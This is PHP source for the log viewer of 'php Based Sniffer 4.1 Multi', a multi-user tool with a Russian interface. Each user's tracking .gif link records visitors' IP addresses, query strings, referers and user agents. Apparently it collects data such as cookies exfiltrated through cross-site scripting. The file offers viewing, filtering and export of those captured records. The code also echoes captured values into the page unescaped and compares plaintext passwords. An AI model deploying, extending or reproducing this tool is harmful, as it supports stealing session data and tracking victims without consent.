<?
define("FILE", "log.php");

require "config.php";
require "functions.php";

$users = array();
$users_content = get_file_content($users_filename);
if ($users_content !== NULL) $users = unserialize($users_content);

if (urldecode($_SERVER['REQUEST_URI']) != $_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING'] and $_GET['user']) $virtual_folder = true;
	else $virtual_folder = false;

if ($virtual_folder) $user = $_GET['user'];
	else $user = $_SERVER['PHP_AUTH_USER'];

if ($user) {
	$user = strtolower($user);
	foreach ($users as $id => $info) {
		$some_user = unserialize($info);
		if ($user == $some_user['login']) {
			$this_user = $some_user;
			$password = $this_user['password'];
		}
	}
}
if (!$password) unset($user);

if (!$user and $virtual_folder) {
	header("Location: ../log.php");
	die();
}

$authorized = false;
if ($user and isset($_SERVER['PHP_AUTH_PW'])) {
	if ($_SERVER['PHP_AUTH_PW'] == $password) $authorized = true;
	if ($authorized and !$virtual_folder) {
		header("Location: $user/log.php");
		die();
	}
}

if (!$authorized) {
	header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4.1 Multi\"");
	header("HTTP/1.1 401 Unauthorized");
	if ($_GET['logout']) die("Вы успешно вышли.<br>\n<br>\n<a href=\"../\">Главная страница</a>");
		else die("В доступе отказано.");
}

if ($_GET['export']) {
	header("Content-Type: application/octet-stream");
	header("Content-Disposition: attachment; filename=\"mydata@".date("Y-m-d").".txt\"");
	$data = array();
	$data_content = get_file_content($data_filename);
	if ($data_content !== NULL) $data = unserialize($data_content);
	$user_data = array();
	foreach ($data as $key => $entrie) {
		$sniffed = unserialize($entrie);
		if ($user == $sniffed['user']) {
			unset($sniffed['user']);
			$user_data[] = serialize($sniffed);
		}
	}
	$user_data_content = serialize($user_data);
	echo $user_data_content;
	die;
}

if ($_GET['changeimg']) {
	$address = stripslashes($_GET['address']);
	$current_path = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	preg_match("/^(https?:\/\/[^\?]+\/)[^\?]+\//i", $current_path, $matches);
	if (substr($address, 0, 7) == "http://" and strpos($address, $matches[1]) === false) $this_user['self_image'] = $address;
		elseif ($address == "") unset($this_user['self_image']);
	$temp_users = array();
	foreach ($users as $id => $info) {
		$some_user = unserialize($info);
		if ($some_user['login'] == $user) $some_user = $this_user;
		$temp_users[] = serialize($some_user);
	}
	$users_content = serialize($temp_users);
	put_file_content($users_filename, $users_content);
	die;
}

if ($_GET['logout']) {
	header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4.1 Multi\"");
	die("Чтобы выйти, вы должны нажать OK, чтобы очистить парольный кэш браузера, а затем Отмена, чтобы закрыть диалог авторизации.");
}

$this_user['last_visited'] = time();
$temp_users = array();
foreach ($users as $id => $info) {
	$some_user = unserialize($info);
	if ($this_user['login'] == $some_user['login']) $some_user = $this_user;
	$temp_users[] = serialize($some_user);
}
$users_content = serialize($temp_users);
put_file_content($users_filename, $users_content);

if (isset($i_max_entries[$user])) $max_entries = $i_max_entries[$user];
if (isset($i_entries_on_page[$user])) $entries_on_page = $i_entries_on_page[$user];
$self_image = ($this_user['self_image']) ? $this_user['self_image'] : "http://";

$data = array();
$data_content = get_file_content($data_filename);
if ($data_content !== NULL) $data = unserialize($data_content);
$user_data = array(); $user2all = array(); $i=0;
foreach ($data as $key => $entrie) {
	$sniffed = unserialize($entrie);
	if ($user == $sniffed['user']) {
		$user_data[$i] = serialize($sniffed);
		$user2all[$i] = $key;
		$i++;
	}
}
$entries_num = count($user_data);

if ($_POST['delete']) {
	$new_entries_num = del_entries($data, $user_data, $user2all, $_POST['select'], $_POST['count']);
	if ($entries_on_page > 0) {
		$pages_num = ceil($new_entries_num/$entries_on_page);
		if ((int)$_GET['page'] <= 0) $page = 1;
			elseif ((int)$_GET['page'] > $pages_num) $page = $pages_num;
				else $page = (int)$_GET['page'];
	}
	$path = ($page > 1) ? FILE."?page=".$page : FILE;
	header("Location: $path");
	die;
}

if ($_GET['order'] and preg_match("/^(a|de)sc$/i", $_GET['order'])) $order = $_GET['order'];
	elseif ($_COOKIE['s_order'] and preg_match("/^(a|de)sc$/i", $_COOKIE['s_order'])) $order = $_COOKIE['s_order'];
		else $order = "asc";
setcookie("s_order", $order, time()+7776000);

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	$current_path = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	preg_match("/^https?:\/\/[^\/]+([^\?]*\/)[^\?]+\//i", $current_path, $matches);
	setcookie("s_style", $current_style, time()+7776000, $matches[1]);

	$files = array(); $styles_error = 0;
	if (!$dir = @opendir("styles")) {
		if (!file_exists("styles")) $styles_error = 1;
			else $styles_error = 2;
	}

	if (!$styles_error) {
		while ($file = readdir($dir)) {
			if (!is_dir("styles/$file") and !($file == "." or $file == "..")) $files[] = $file;
		}
		closedir($dir);

		for ($i=0; $i<count($files); $i++) {
			$style_content = get_file_content("styles/".$files[$i]);
			$style_name = trim(substr($style_content, strpos($style_content, "/*")+3, (strpos($style_content, "*/")-1)-(strpos($style_content, "/*")+3)));
			$style_codename = substr($files[$i], 0, strpos($files[$i], "."));
			$style_href = "?style=".$style_codename;
			$styles_list .= ($current_style != $style_codename) ? "<a href=\"".$style_href."\">".$style_name."</a>" : $style_name;
			if ($i+1 < count($files)) $styles_list .= " &middot; ";
		}
	}
}

if ($entries_on_page > 0) {
	$entries_shown = $entries_on_page;
	$pages_num = ceil($entries_num/$entries_on_page);
}
else {
	$entries_shown = $entries_num;
	$pages_num = 1;
}

if ((int)$_GET['page'] < 1) $page = 1;
	elseif ((int)$_GET['page'] > $pages_num) $page = $pages_num;
		else $page = (int)$_GET['page'];
$path = ($page > 1) ? FILE."?page=$page" : FILE;

if ($pages_num > 1) {
	$pages_list .= "<b>";
	for ($i=1; $i<=$pages_num; $i++) {
		if ($i != $page) {
			if ($i == 1) $pages_list .= "<a href=\"".FILE."\">";
				else $pages_list .= "<a href=\"".FILE."?page=$i\">";
		}
			else $pages_list .= "<span class=\"choosed\">";
		$pages_list .= $i;
		if ($i != $page) $pages_list .= "</a>";
			else $pages_list .= "</span>";
		$pages_list .= " ";
	}
	$pages_list .= "</b>";
}

if ($order == "asc") {
	$start_num = ($page-1) * $entries_shown;
	$finish_num = ($page * $entries_shown < $entries_num) ? $page * $entries_shown : $entries_num;
}
elseif ($order == "desc") {
	$start_num = ($page * $entries_shown < $entries_num) ? $entries_num - $page * $entries_shown : 0;
	$finish_num = $entries_num - ($page-1) * $entries_shown;
}
$entries_shown = $finish_num - $start_num;

$hosts = array(); $new_num = 0; $all_new_num = 0;
foreach ($user_data as $key => $entrie) {
	$sniffed = unserialize($entrie);
	if (!$sniffed['old']) $all_new_num++;
	if ($key < $start_num or $key >= $finish_num) continue;
	if (!$sniffed['old']) $new_num++;
	preg_match("/^https?:\/\/([^\/]+)/i", $sniffed['referer'], $matches);
	$sniffed['host'] = $matches[1];
	if (!empty($sniffed['host']) and !in_array($sniffed['host'], $hosts)) $hosts[] = $sniffed['host'];
	if (empty($sniffed['referer'])) $emptyreferer = true;
	if (empty($sniffed['query'])) $emptyquery = true;
}

if ($entries_on_page > 0 and $pages_pos != "up" and $pages_pos != "down" and $pages_pos != "updown") die("Неверное значение константы <code>\$pages_pos</code>.");
if ($menu_pos != "corner" and $menu_pos != "down") die("Неверное значение константы <code>\$menu_pos</code>.");
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>Лог сниффера для <?=$user?></title>
<link rel="stylesheet" type="text/css" href="../styles/<?=$style_filename?>">

<style type="text/css">
table.margined {margin-top:4px;}
td.padded {padding:2px 0 3px 0;}
td.right-padded {padding:2px 5px 3px 0; text-align:right;}
td.top-right-padded {padding:5px 5px 3px 0; vertical-align:top; text-align:right;}
.choosed {border:1px solid; padding:0 2px 1px 2px;}
.input {font-size:12px;}
.visible {display:;}
.hidden {display:none;}
</style>

<script type="text/javascript">
var load_timeout = 0, drop_timeout = 0;
var active = 0;

function getElement(element_id)
{
	if (document.getElementById) return document.getElementById(element_id);
		else if (document.all) return document.all[element_id];
		else if (document.layers) return document.layers[element_id];
		else return null;
}

function showElement(element_id)
{
	getElement(element_id).className = 'visible';
}

function hideElement(element_id)
{
	getElement(element_id).className = 'hidden';
}

function isShown(element_id)
{
	if (getElement(element_id).className == 'visible') return true;
		else return false;
}

<? if ($entries_num > 0) { ?>
window.onload = function() {
	showContent();
	setInterval('textFields()', 1000);
}

var show_ip_focused = 0, show_query_focused = 0, show_agent_focused = 0;
var choosed_item = 'show_all';

function trim(s)
{
	s = s.replace(/^\s+/, '');
	s = s.replace(/\s+$/, '');
	return s;
}

function shownNum()
{
	var shown;
	for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
		if (isShown('entrie['+i+']')) shown++;
	}
	getElement('shown_num').innerHTML = shown;
	if (shown == 0) getElement('check_all').disabled = true;
		else getElement('check_all').disabled = false;
	if (shown == 0) getElement('nothing').innerHTML = 'Данной выборке не соотвутствует ни одной записи.';
		else getElement('nothing').innerHTML = '';
}

function checkedNum(new_active, e)
{
	if (e && e.shiftKey) {
		if (new_active > active) {
			for (i=active; i<=new_active; i++) {
				if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = getElement('select['+new_active+']').checked;
			}
		}
		if (new_active < active) {
			for (i=active; i>=new_active; i--) {
				if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = getElement('select['+new_active+']').checked;
			}
		}
	}
	var checked, shown_checked;
	for (i=<?=$start_num?>, checked=0, shown_checked=0; i<<?=$finish_num?>; i++) {
		if (getElement('select['+i+']').checked) {
			checked++;
			if (isShown('entrie['+i+']')) shown_checked++;
			getElement('table['+i+']').className = 'marked';
		}
			else getElement('table['+i+']').className = 'unmarked';
	}
	if (shown_checked != 0 && shown_checked == getElement('shown_num').innerHTML) getElement('check_all').checked = true;
		else getElement('check_all').checked = false;
	getElement('checked_num').innerHTML = checked;
	active = new_active;
}

function checkAll()
{
	if (getElement('check_all').checked) {
		for (i=<?=$start_num?>; i<<?=$finish_num?>; i++) {
			if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = true;
		}
	}
	if (!getElement('check_all').checked) {
		for (i=<?=$start_num?>; i<<?=$finish_num?>; i++) {
			if (isShown('entrie['+i+']')) getElement('select['+i+']').checked = false;
		}
	}
	checkedNum(getElement('shown_num').innerHTML-1);
}

function switchItem(item_name)
{
	var invert = false;
	if (getElement('invert').checked) invert = true;
	if (item_name == 'show_all' && !invert) getElement('show_all').innerHTML = '<span class="choosed">все</span>';
		else if (item_name == 'show_all' && invert) getElement('show_all').innerHTML = '<span class="choosed">ни одного</span>';
			else getElement('show_all').innerHTML = '<a href="javascript:applyFilter(\'show_all\');">все</a>';
<? if ($all_new_num > 0) { ?>
	if (item_name == 'show_new' && !invert) getElement('show_new').innerHTML = '<span class="choosed">новые</span>';
		else if (item_name == 'show_new' && invert) getElement('show_new').innerHTML = '<span class="choosed">старые</span>';
			else getElement('show_new').innerHTML = '<? if ($pages_num > 1) { ?><span title="Новых записей на странице/всего"><? } ?><a href="javascript:applyFilter(\'show_new\');">новые</a> (<b class="col"><?=$new_num?></b><? if ($pages_num > 1) { ?>/<b class="col"><?=$all_new_num?></b><? } ?>)<? if ($pages_num > 1) { ?></span><? } ?>';
<? }
if ($emptyquery) { ?>
	if (item_name == 'show_empty_query' && !invert) getElement('show_empty_query').innerHTML = '<span class="choosed">с пустым QUERY</span>';
		else if (item_name == 'show_empty_query' && invert) getElement('show_empty_query').innerHTML = '<span class="choosed">с непустым QUERY</span>';
			else getElement('show_empty_query').innerHTML = '<a href="javascript:applyFilter(\'show_empty_query\');">c&nbsp;пустым&nbsp;QUERY</a>';
<? }
if ($emptyreferer) { ?>
	if (item_name == 'show_empty_referer' && !invert) getElement('show_empty_referer').innerHTML = '<span class="choosed">с пустым REFERER</span>';
		else if (item_name == 'show_empty_referer' && invert) getElement('show_empty_referer').innerHTML = '<span class="choosed">с непустым REFERER</span>';
			else getElement('show_empty_referer').innerHTML = '<a href="javascript:applyFilter(\'show_empty_referer\');">c&nbsp;пустым&nbsp;REFERER</a>';
<? } ?>
	if (item_name == 'show_host' && !invert) getElement('show_host').innerHTML = '<span class="choosed">по хосту</span>:';
		else if (item_name == 'show_host' && invert) getElement('show_host').innerHTML = '<span class="choosed">кроме хоста</span>:';
			else getElement('show_host').innerHTML = 'по хосту:';
	if (item_name == 'show_ip' && !invert) getElement('show_ip').innerHTML = '<span class="choosed">по IP</span>:';
		else if (item_name == 'show_ip' && invert) getElement('show_ip').innerHTML = '<span class="choosed">кроме IP</span>:';
			else getElement('show_ip').innerHTML = 'по IP:';
	if (item_name == 'show_query' && !invert) getElement('show_query').innerHTML = '<span class="choosed">по QUERY</span>:';
		else if (item_name == 'show_query' && invert) getElement('show_query').innerHTML = '<span class="choosed">кроме QUERY</span>:';
			else getElement('show_query').innerHTML = 'по QUERY:';
	if (item_name == 'show_agent' && !invert) getElement('show_agent').innerHTML = '<span class="choosed">по USER-AGENT</span>:';
		else if (item_name == 'show_agent' && invert) getElement('show_agent').innerHTML = '<span class="choosed">кроме USER-AGENT</span>:';
			else getElement('show_agent').innerHTML = 'по USER-AGENT:';
	choosed_item = item_name;
}

function applyFilter(filter_name)
{
	var shown, host;
	if (filter_name == 'invert' && !getElement('invert').checked) filter_name = choosed_item;
	if (filter_name != 'invert' && getElement('invert').checked) getElement('invert').checked = false;
	if (filter_name != 'show_host' && filter_name != 'invert') getElement('choose_host').selected = true;
	if (filter_name == 'show_all') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) showElement('entrie['+i+']');
		switchItem('show_all');
	}
<? if ($all_new_num > 0) { ?>
	if (filter_name == 'show_new') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('new['+i+']').value == true) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_new');
	}
<? }
if ($emptyquery) { ?>
	if (filter_name == 'show_empty_query') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('query['+i+']').innerHTML == '') showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_empty_query');
	}
<? }
if ($emptyreferer) { ?>
	if (filter_name == 'show_empty_referer') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('host['+i+']').innerHTML == '') showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_empty_referer');
	}
<? } ?>
	if (filter_name == 'show_host') {
		for (i=0, shown=0; i<<?=count($hosts)?>; i++) {
			if (getElement('show_host['+i+']').selected) host = getElement('show_host['+i+']').innerHTML;
		}
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('host['+i+']').innerHTML == host) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_host');
	}
	if (filter_name == 'show_ip') {
		var show_ip_addr = trim(getElement('show_ip_addr').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('ip['+i+']').innerHTML.indexOf(show_ip_addr) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_ip');
	}
	if (filter_name == 'show_query') {
		var show_query_text = trim(getElement('show_query_text').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('query['+i+']').innerHTML.indexOf(show_query_text) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_query');
	}
	if (filter_name == 'show_agent') {
		var show_agent_info = trim(getElement('show_agent_info').value);
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (getElement('agent['+i+']').innerHTML.indexOf(show_agent_info) != -1) showElement('entrie['+i+']');
				else hideElement('entrie['+i+']');
		}
		switchItem('show_agent');
	}
	if (filter_name == 'invert') {
		for (i=<?=$start_num?>, shown=0; i<<?=$finish_num?>; i++) {
			if (!isShown('entrie['+i+']')) showElement('entrie['+i+']');
				else if (getElement('entrie['+i+']')) hideElement('entrie['+i+']');
		}
		switchItem(choosed_item);
	}
	shownNum();
	checkedNum(getElement('shown_num').innerHTML-1);
}

function isChecked()
{
	var checked = parseFloat(getElement('checked_num').innerHTML);
	if (checked == 0) {
		checked = false;
		alert('Вы не отметили ни одной записи!')
	}
	return checked;
}

function moreFilters()
{
	if (getElement('more_filters').innerHTML == 'доп. фильтры') {
		getElement('more_filters').innerHTML = 'убрать доп. фильтры';
		showElement('td_1'); showElement('td_2'); showElement('td_3');;
	}
	else if (getElement('more_filters').innerHTML == 'убрать доп. фильтры') {
		getElement('more_filters').innerHTML = 'доп. фильтры';
		hideElement('td_1'); hideElement('td_2'); hideElement('td_3');
	}
}

function textFields()
{
	if (show_ip_focused == 1 && getElement('show_ip_addr').value != '') applyFilter('show_ip');
	if (show_query_focused == 1 && getElement('show_query_text').value != '') applyFilter('show_query');
	if (show_agent_focused == 1 && getElement('show_agent_info').value != '') applyFilter('show_agent');
}

function realIPInfo()
{
	alert('В этом поле отображается IP-адрес(а), передаваемый(-ые) в параметре HTTP_X_FORWARDED_FOR наряду с основным IP. Как правило, это поле задействовано, если клиент соединяется с сервером не напрямую, а через неанонимный прокси-сервер (в таком случае отображается настоящий IP), либо через локальную сеть (в таком случае отображается внутрисетевой IP пользователя).');
}

function showContent()
{
	getElement('check_all').disabled = false;
	getElement('invert').checked = false;
	hideElement('loading');
	checkedNum(<?=$entries_num-1?>);
	showElement('content');
	showElement('check_control');
	clearTimeout(load_timeout);
}

<? }
if ($allow_changeimg) { ?>
var img_loaded = false;
var self_image = '<?=$self_image?>';

function changeImg()
{
	clearTimeout(load_timeout);
	clearTimeout(drop_timeout);
	hideElement('change_ok');
	hideElement('new_img_show');
	var address = prompt("Введите адрес картинки в Интернете (очистите поле, чтобы сбросить):", self_image);
	if (address && address != 'http://' && address.substr(0, 7) == 'http://') {
		img_loaded = false;
		getElement('change_ok').style.top = document.body.scrollTop + 15;
		getElement('change_label').innerHTML = "Загрузка...";
		showElement('change_ok');
		getElement('new_img').onload = function () {
			img_loaded = true;
			clearTimeout(load_timeout);
			showElement('change_ok');
			showElement('new_img_show');
			getElement('change_label').innerHTML = "Картинка успешно заменена.";
			getElement('change_link').src = 'log.php?changeimg=1&address=' + address;
			self_image = address;
			drop_timeout = setTimeout('dropChangeImg()', 3500);
		}
		getElement('new_img').src = address;
		load_timeout = setTimeout('checkTime()', 15000);
	}
	else if (address == '') {
		showElement('change_ok');
		getElement('change_label').innerHTML = "Картинка успешно сброшена.";
		getElement('change_link').src = 'log.php?changeimg=1&address=';
		self_image = 'http://';
		drop_timeout = setTimeout('dropChangeImg()', 3500);
	}
}

function checkTime()
{
	if (img_loaded == false) {
		clearTimeout(load_timeout);
		getElement('new_img').src = '';
		getElement('change_label').innerHTML = "Не удалось загрузить картинку.";
		setTimeout('dropChangeImg()', 3500);
	}
}

function dropChangeImg()
{
	clearTimeout(drop_timeout);
	hideElement('change_ok');
	hideElement('new_img_show');
}
<? } ?>
</script>
</head>

<body>
<? if ($menu_pos == "corner") { ?>
<div style="position:absolute; right:20px;" align="left">
<li type="circle"><a href="../faq.php" onClick="window.open('../faq.php', 'faq', 'width=500, height=402, scrollbars=yes'); return false;">Справка (FAQ)</a></li>
<? if ($entries_num > 0) { ?><li type="circle"><a href="<?=FILE?>?export=1">Сохранить мои записи&#133;</a></li><? }
if ($styles_enabled) { ?><li type="circle"><? if ($styles_error == 1) echo "Папка styles не найдена.\n"; elseif ($styles_error == 2) echo "Не удается открыть папку styles.\n"; else echo "Стиль: $styles_list\n"; ?></li><? }
if ($allow_changeimg) { ?><li type="circle"><a href="javascript:changeImg();">Сменить вид картинки&#133;</a></li><br><br><div id="change_ok" align="center" style="margin-bottom:4px;" class="hidden"><b><span id="change_label">Картинка успешно заменена.</span></b></div><div id="new_img_show" align="center" style="padding:2px; border:1px solid;" class="hidden"><img id="new_img" style="background-color:white;"><img id="change_link" class="hidden"></div><? } ?>
</div>
<? }
if ($menu_pos == "down") { ?>
<div style="position:absolute; right:20px;" align="right"><a href="javascript:changeImg();">Сменить вид картинки&#133;</a><br><br><div id="change_ok" align="center" style="margin-bottom:4px;" class="hidden"><b><span id="change_label">Картинка успешно заменена.</span></b></div><div id="new_img_show" align="center" style="padding:2px; border:1px solid;" class="hidden"><img id="new_img" style="background-color:white;"><img id="change_link" class="hidden"></div></div>
<? } ?>
<p>Вы авторизованы как <b class="col"><?=$user?></b>. <? if ($user == $admin) { ?><a href="../admin.php">Администрирование</a>.<? } ?> <a href="log.php?logout=1">Выйти</a> <small>(нажмите OK, затем Отмена)</small></p>
<? if ($info_line) { ?>Сейчас: <i><?=date("d.m.Y H:i")?></i>. &nbsp;Ваш IP: <b><?=$_SERVER['REMOTE_ADDR']?></b>. <a href="../<?=$user?>.gif" target="_blank">Ссылка на <?=$user?>.gif</a> &nbsp;<a href="javascript:location.reload();" style="text-decoration:none;"><img src="../img/refresh.gif" width="9" height="10" border="0" alt="Обновить" style="vertical-align:middle;">&nbsp;<span style="text-decoration:underline;">Обновить</span></a><? }
if ($entries_num > 0) { ?>
<form method="post" action="<?=$path?>" onSubmit="return isChecked();">
<input type="hidden" name="delete" value="1">
<input type="hidden" name="count" value="<?=$entries_num?>">
<span id="check_control" class="hidden">
<p><input type="submit" class="button" value="Удалить отмеченные">
&nbsp;&nbsp;<input type="checkbox" id="check_all" onClick="checkAll();"><label for="check_all">отметить все</label></p></span>
<? } ?>
<p>Всего записей: <b class="col"><?=$entries_num?></b>.
<? if ($entries_num > 0) { ?>
<span id="loading"><p><b>Загрузка записей<span id="dots">...</span></b></p></span>
<script type="text/javascript">
function loading()
{
	if (getElement('dots').innerHTML == '...') getElement('dots').innerHTML = '';
	else if (getElement('dots').innerHTML == '') getElement('dots').innerHTML = '.';
	else if (getElement('dots').innerHTML == '.') getElement('dots').innerHTML = '..';
	else if (getElement('dots').innerHTML == '..') getElement('dots').innerHTML = '...';
	load_timeout = setTimeout('loading()', 200);
}
loading();
</script>
<span id="content" class="hidden">
Из них показано: <b class="col"><span id="shown_num"><?=$entries_shown?></span></b>. Отмечено: <b class="col"><span id="checked_num">0</span></b>.&nbsp;&nbsp;<br>
<table cellpadding="0" cellspacing="0" class="margined">
<tr>
<td rowspan="2" valign="top" class="padded">
Сортировка: <? if ($order == "desc") { ?><span class="choosed">новые вверху</span> &nbsp;<a href="log.php?order=asc">новые внизу</a><? } if ($order == "asc") { ?><a href="log.php?order=desc">новые вверху</a> &nbsp;<span class="choosed">новые внизу</span><? } ?></td>
</tr>
</table>
<table cellpadding="0" cellspacing="0" class="margined">
<tr>
<td class="right-padded">Показывать запросы:</td>
<td class="padded">
<span id="show_all"><span class="choosed">все</span></span><? if ($all_new_num > 0) { ?> &nbsp;<span id="show_new"><? if ($pages_num > 1) { ?><span title="Новых записей на странице/всего"><? } ?><a href="javascript:applyFilter('show_new');">новые</a> (<b class="col"><?=$new_num?></b><? if ($pages_num > 1) { ?>/<b class="col"><?=$all_new_num?></b><? } ?>)<? if ($pages_num > 1) { ?></span><? } ?></span><? } if ($emptyquery) { ?> &nbsp;<span id="show_empty_query"><a href="javascript:applyFilter('show_empty_query');">c&nbsp;пустым&nbsp;QUERY</a></span><? } if ($emptyreferer) { ?> &nbsp;<span id="show_empty_referer"><a href="javascript:applyFilter('show_empty_referer');">c&nbsp;пустым&nbsp;REFERER</a></span><? } ?>
</td>
<td align="right">&nbsp;&nbsp;&nbsp;<input type="checkbox" id="invert" onClick="javascript:applyFilter('invert');"><label for="invert">обратить</label></td>
</tr>
<tr>
<td class="top-right-padded">Фильтровать:</td>
<td colspan="2">
<table cellpadding="0" cellspacing="0">
<tr>
<td width="104" class="right-padded"><span id="show_host">по хосту:</span></td>
<td class="padded">
<select class="input" onChange="if (!getElement('choose_host').selected) applyFilter('show_host');"><option id="choose_host" selected>(выберите)</option><? foreach ($hosts as $key => $host) echo "<option id=\"show_host[$key]\">{$host}</option>"; ?></select>
</td>
</tr>
<tr>
<tr id="td_1" class="hidden">
<td width="104" class="right-padded"><span id="show_ip">по IP:</span></td>
<td class="padded">
<input type="text" id="show_ip_addr" class="input" onFocus="show_ip_focused = 1;" onBlur="show_ip_focused = 0;">
</td>
</tr>
<tr id="td_2" class="hidden">
<td width="104" class="right-padded"><span id="show_query">по QUERY:</span></td>
<td class="padded">
<input type="text" id="show_query_text" class="input" onFocus="show_query_focused = 1;" onBlur="show_query_focused = 0;">
</td>
</tr>
<tr id="td_3" class="hidden">
<td width="104" class="right-padded"><span id="show_agent">по USER-AGENT:</span></td>
<td class="padded">
<input type="text" id="show_agent_info" class="input" onFocus="show_agent_focused = 1;" onBlur="show_agent_focused = 0;">
</td>
</tr>
<tr>
<td colspan="2" align="center">
<small>(<a href="javascript:;" onClick="moreFilters();" id="more_filters">доп. фильтры</a>)</small>
</td>
</tr>
</table>
</td>
</tr>
</table>
<? } ?>
</p>
<p></p>
<? if ($max_entries != 0 and $entries_num >= $max_entries) { ?>
<p><b>Внимание! Достигнут лимит записей! При очередном обращении к&nbsp;снифферу старые записи будут удаляться.</b></p>
<? }

if ($pages_num > 1 and ($pages_pos == "up" or $pages_pos == "updown")) echo "<p>Страницы: $pages_list</p>\n";

for ($i=0; $i<$entries_shown; $i++) {
	$key = ($order == "asc") ? $start_num+$i : $finish_num-$i-1;
	$entrie = $user_data[$key];
	$sniffed = unserialize($entrie);
	preg_match("/^https?:\/\/([^\/]+)\//i", $sniffed['referer'], $matches);
	$sniffed['host'] = $matches[1];
	$sniffed['real_ip'] = preg_replace("/(, )?".$sniffed['ip']."(, )?/", "", $sniffed['real_ip']);
?>
<div id="entrie[<?=$key?>]" class="visible">
<input type="hidden" id="new[<?=$key?>]" value="<? if ($sniffed['old']) echo 0; else echo 1; ?>">
<table width="100%" cols="2" id="table[<?=$key?>]" class="unmarked">
<tr>
<td colspan="2"><? if (!$sniffed['old']) { ?><span class="new">(new!)</span> <? } if (!empty($sniffed['host'])) { ?>Запрос с <b class="col"><span id="host[<?=$key?>]"><?=$sniffed['host']?></span></b><? } else { ?><span id="host[<?=$key?>]"></span>Запрос неизвестно откуда<? } ?> — <i><?=$sniffed['date']?></i></td>
</tr>
<tr>
<td width="30"><input type="checkbox" name="select[<?=$key?>]" id="select[<?=$key?>]" value="<?=$key?>" onClick="checkedNum(<?=$key?>, event);"></td>
<td>
<label for="select[<?=$key?>]"><b>IP:</b></label> <span id="ip[<?=$key?>]"><?=$sniffed['ip']?></span> <small>(<a href="http://nic.ru/whois/?ip=<?=$sniffed['ip']?>" target="_blank">whois</a>)</small><? if (!empty($sniffed['real_ip'])) { ?> &nbsp;&nbsp;<b>Real IP<a href="javascript:realIPInfo();">*</a>:</b> <?=$sniffed['real_ip']?> <small>(<a href="http://nic.ru/whois/?ip=<?=$sniffed['real_ip']?>" target="_blank">whois</a>)</small><? } ?><br>
<label for="select[<?=$key?>]"><b>QUERY:</b></label> <span id="query[<?=$key?>]"><?=$sniffed['query']?></span><br>
<label for="select[<?=$key?>]"><b>REFERER:</b></label> <? if ($sniffed['referer']) { ?><a href="<?=$sniffed['referer']?>" target="_blank"><?=$sniffed['referer']?></a><? } ?><br>
<label for="select[<?=$key?>]"><b>AGENT:</b></label> <span id="agent[<?=$key?>]"><?=$sniffed['agent']?></span><br>
</td>
</tr>
</table>
<br>
</div>
<?
	unset($sniffed['host']);
	if (!$sniffed['old']) $sniffed['old'] = 1;
	$data[$user2all[$key]] = serialize($sniffed);
}

if ($entries_num > 0) {
	$data_content = serialize($data);
	put_file_content($data_filename, $data_content);
?>
<span id="nothing"></span>
<?
	if ($pages_num > 1 and ($pages_pos == "down" or $pages_pos == "updown")) echo "<p>Страницы: $pages_list</p>\n";
?>
</span>
</form>
<? } 
if ($menu_pos == "down") { ?>
<li type="circle"><a href="../faq.php" onClick="window.open('../faq.php', 'faq', 'width=500, height=402, scrollbars=yes'); return false;">Справка (FAQ)</a></li>
<? if ($entries_num > 0) { ?><li type="circle"><a href="<?=FILE?>?export=1">Сохранить мои записи&#133;</a></li><? }
if ($styles_enabled) { ?><li type="circle"><? if ($styles_error == 1) echo "Папка styles не найдена.\n"; elseif ($styles_error == 2) echo "Не удается открыть папку styles.\n"; else echo "Стиль: $styles_list\n"; ?></li><? }
} ?>
<p id="copyright">
php Based Sniffer 4.1 Multi<br>
&copy; <a href="http://kanick.ru">Kanick</a> 2005—2006
<a href="#">#</a></p>
</body>
</html>